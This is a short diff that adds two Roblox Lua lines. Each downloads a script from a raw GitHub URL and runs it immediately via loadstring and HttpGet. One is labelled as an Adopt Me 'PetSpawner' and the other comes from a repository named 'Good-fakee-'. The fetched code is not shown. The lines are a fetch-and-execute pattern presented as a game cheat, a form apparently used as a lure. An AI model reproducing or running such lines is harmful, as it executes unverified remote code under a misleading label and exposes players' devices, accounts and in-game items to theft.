@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/INF-Hub-PL/AdoptMeSpawner/refs/heads/main/PetSpawner"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mylesbaysden8-hash/Good-fakee-/refs/heads/main/Good",true))()
